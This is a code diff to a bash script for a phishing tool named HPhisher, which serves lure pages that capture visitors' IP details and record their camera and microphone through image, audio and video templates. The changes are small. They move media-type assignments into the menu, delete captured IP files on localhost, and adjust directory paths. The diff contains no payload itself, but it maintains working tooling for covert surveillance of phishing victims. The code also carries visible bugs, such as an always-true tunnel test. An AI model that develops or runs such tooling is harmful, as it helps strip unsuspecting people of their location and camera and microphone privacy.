@@ -483,8 +483,10 @@ capture_ip() {
 				echo -e " "
 	if [ reply_tunnel=1 ]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
+		rm -rf .server/www/ip.txt
 	elif [ reply_tunnel=01 ]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
+		rm -rf .server/www/ip.txt
 	else
 		ip_details
 		save_ip
@@ -500,7 +502,7 @@ save_ip() {
 		mv ${logs_dir} ${files_dir}/${site_name}
 		mv .server/www/ip.txt ${logs_full_dir}
 	fi
-				echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} ${logs_full_dir}"
+	echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} ${logs_full_dir}"
 }
 ip_details() {
 	IFS='\n'
@@ -647,15 +649,19 @@ read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher : ${BLUE}" reply_site
 echo " "
 case $reply_site in
         1 | 01)
+		type=image
 		site_name=image
                 site_image;;
         2 | 02)
+		type=audio
 		site_name=audio
                 site_audio;;
 	3 | 03)
+		type=video
 		site_name=video
                 site_video;;
 	4 | 04)
+		type=both
 		site_name=video
 		site_video_audio;;
 	A | a)
@@ -718,7 +724,6 @@ read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} 
 
 site_image(){
 clear
-type=image
 echo -e " "
 echo -e " "
 banner
@@ -780,7 +785,6 @@ esac
 
 site_audio(){
 clear
-type=audio
 echo -e " "
 echo -e " "
 banner
@@ -806,7 +810,6 @@ echo -e " "
 echo -e " "
 banner
 echo -e " "
-type=video
 duration=5000
 echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
 echo -e " "
@@ -834,9 +837,9 @@ case $reply_template in
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; banner; site_video; };;
 esac
-cd ${sites_dir}/video/${site_template}
+cd ".sites/video/${site_template}"
 sed "s+mediaType+"video"+g" template.js | sed "s+recordingTime+"$duration"+g" > recorder.js
-cd ${pro_dir}
+cd "${pro_dir}"
 }
 
 site_video_audio(){
@@ -845,7 +848,6 @@ echo -e " "
 echo -e " "
 banner
 echo -e " "
-type=both
 duration=5000
 echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
 echo -e " "
@@ -873,7 +875,7 @@ case $reply_template in
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; banner; site_video; };;
 esac
-cd ${sites_dir}/video/${site_template}
+cd ${sites_dir}/video/${site_template}/
 sed "s+mediaType+"both"+g" template.js | sed "s+recordingTime+"$duration"+g" > recorder.js
 cd ${pro_dir}
 }
